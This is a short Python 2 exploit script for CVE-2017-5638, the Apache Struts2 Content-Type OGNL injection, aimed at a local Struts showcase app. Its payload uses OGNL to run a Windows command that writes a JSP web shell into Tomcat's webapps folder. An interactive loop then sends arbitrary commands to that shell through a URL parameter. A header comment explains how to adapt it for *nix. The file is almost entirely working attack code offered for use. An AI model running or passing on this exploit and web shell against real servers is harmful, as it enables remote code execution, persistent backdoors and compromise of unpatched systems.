# Windows exploit. Modify the payload and shellpath variables to make it work on *nix systems
# CVE-2017-5638

import requests

def writeshell():
	url = 'http://127.0.0.1:8080/struts2-showcase-2.3.12/showcase.action'
	shellpath=".\\\\tomcat\\\\webapps\\\\examples\\\\jsp\\\\shell.jsp"
	payload = "%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('cmd /c echo  ^<%@ page import=\"java.util.*,java.io.*\"%^> ^<% Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"x\")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine();while(disr != null) {out.println(disr);disr = dis.readLine();} %^>  > " + shellpath + "'))}"
	headers = {'Content-Type':payload}
	proxies={'http':'http://127.0.0.1:8000'}
	r = requests.get(url,headers=headers,proxies=proxies)

def looper():
	while True:
	    com = raw_input('machine:$ ').split('\n')
	    if com[0] == 'exit':
	        break
	    else:
	       	execcommand(com[0])

def execcommand(cmd):
	url = 'http://127.0.0.1:8080/examples/jsp/shell.jsp?x=' + cmd
	r = requests.get(url)
	print r.text
	
if __name__ == "__main__":
	writeshell()
	looper()